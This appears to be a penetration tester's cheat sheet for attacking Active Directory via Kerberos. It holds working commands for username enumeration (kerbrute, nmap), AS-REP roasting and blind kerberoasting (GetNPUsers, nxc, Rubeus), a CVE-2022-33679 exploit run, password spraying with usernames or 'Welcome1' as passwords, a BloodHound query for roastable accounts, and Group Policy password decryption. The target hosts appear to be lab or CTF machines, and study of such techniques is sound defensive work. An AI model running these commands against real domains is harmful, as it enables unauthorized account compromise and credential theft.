## User Enumeration with Kerbrute
#### check if usernames are valid:
```bash
kerbrute userenum --dc 10.10.30.203 -d intelligence.htb users.txt
```
- refine output with vi:
```
:%s/^.*VALID USERNAME:\s*\(\w\+\)@lab\.enterprise.*$/\1/
```
- deletes everything outside of VALID USERNAME and @lab.enterprise
- if returns weird hash, use `GetNPUsers.py` instead to get full hash

---
#### Kerberos, port 88
```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip>
```

---
#### ASREP roast
```bash
GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile users.txt
```
or with file output:
```bash
GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile users.txt -format hashcat -outputfile <output.txt>
```
Or with nxc:
```bash
nxc ldap <dc_ip> -u users.txt -p '' --asreproast output.txt
```
or from target machine:
```powershell
Rubeus.exe asreproast /format:hashcat
```

---
#### Blind Kerberoasting
```bash
GetUserSPNs.py -no-preauth <domain>/ -usersfile user_list.txt -dc-host <dc_ip>
```
- `GetUserSPNs.py -no-preauth` == `GetNPUsers.py` 
	- so this is essentially the same as ASREP Roasting
or from target machine:
```powershell
Rubeus.exe kerberoast /domain:<domain> /dc:<dc_ip> /nopreauth:<user>
```

---
#### CVE-2022-33679
Similar to ASREP Roasting, but also utilizes a crypto downgrade attack
```
CVE-2022-33679.py <domain>/<user> <target>
```
- ex:
```
python3 CVE-2022-33679.py example.com/user1 HTTP/webserver.example.com
```

---
## Password Spraying without password

### usernames == passwords:
```bash
nxc smb 10.129.231.149 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```
#### lowercase usernames as passwords:
- `cp users.txt users_lowercase.txt`
- vim command to convert all letters to lowercase
```vim
:%s/[A-Z]/\L&/g
```
```bash
nxc smb 10.129.42.194 -u users.txt -p users_lowercase.txt  --no-bruteforce --continue-on-success
```
###### alt-tool for upper/lower case
```
sprayhound -U users.txt -d <domain> -dc <dc_ip> --lower
```
- usernames as lowercase passwords
```
sprayhound -U users.txt -d <domain> -dc <dc_ip> --upper
```
- usernames as uppercase passwords
#### Try local authentication
```bash
nxc smb --local-auth 10.129.42.194 -u users.txt -p users.txt
```
###### Alt tool for nxc (CrackMapExec)
```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
#### Filter for successes
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

---
## Password spraying with password(s)
#### Spray valid users with password Welcome1:
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
#### RPC script to Spray valid users with password Welcome1:
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

---
#### Bloodhound query to find ASREPRoastable users:
```
MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u
```
- requires valid set of creds, but can use to pivot to another user

---
## misc
#### decrypting group policy passwords
```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
![[Pasted image 20250407113525.png]]
- sometimes included as `cpassword` variable in Groups.xml file if found somewhere when enumerating